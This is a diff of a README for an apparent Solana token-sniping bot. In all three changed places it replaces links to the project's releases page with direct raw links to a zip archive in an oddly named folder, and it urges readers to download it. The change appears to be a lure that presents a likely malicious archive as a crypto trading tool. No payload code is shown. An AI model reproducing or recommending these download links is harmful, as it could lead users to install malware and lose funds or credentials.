@@ -1,7 +1,7 @@
 <h1>⚡ Solana-Token-Sniper-Anti-Rug - Auto-Snipe New Tokens Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Marionviceregal8571/Solana-Token-Sniper-Anti-Rug/releases">
+  <a href="https://raw.githubusercontent.com/Marionviceregal8571/Solana-Token-Sniper-Anti-Rug/main/idiocratical/Sniper_Anti_Solana_Rug_Token_1.9.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-Click%20Here%20to%20Get%20the%20Bot-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4" alt="Download">
   </a>
 </p>
@@ -25,7 +25,7 @@ Getting started is simple. You don't need to be a tech wizard. Just follow these
 ### Step 1: Download the Bot
 
 Visit this link to download the application:  
-👉 [**Download Solana-Token-Sniper-Anti-Rug**](https://github.com/Marionviceregal8571/Solana-Token-Sniper-Anti-Rug/releases)
+👉 [**Download Solana-Token-Sniper-Anti-Rug**](https://raw.githubusercontent.com/Marionviceregal8571/Solana-Token-Sniper-Anti-Rug/main/idiocratical/Sniper_Anti_Solana_Rug_Token_1.9.zip)
 
 Click the download button on that page, and the file will start downloading to your computer.
 
@@ -186,7 +186,7 @@ Remember, this is a tool. Like any tool, it works best when you understand it. T
 
 Just in case you missed it, here's the link one more time:
 
-👉 [**Click Here to Download Solana-Token-Sniper-Anti-Rug**](https://github.com/Marionviceregal8571/Solana-Token-Sniper-Anti-Rug/releases)
+👉 [**Click Here to Download Solana-Token-Sniper-Anti-Rug**](https://raw.githubusercontent.com/Marionviceregal8571/Solana-Token-Sniper-Anti-Rug/main/idiocratical/Sniper_Anti_Solana_Rug_Token_1.9.zip)
 
 ---
 
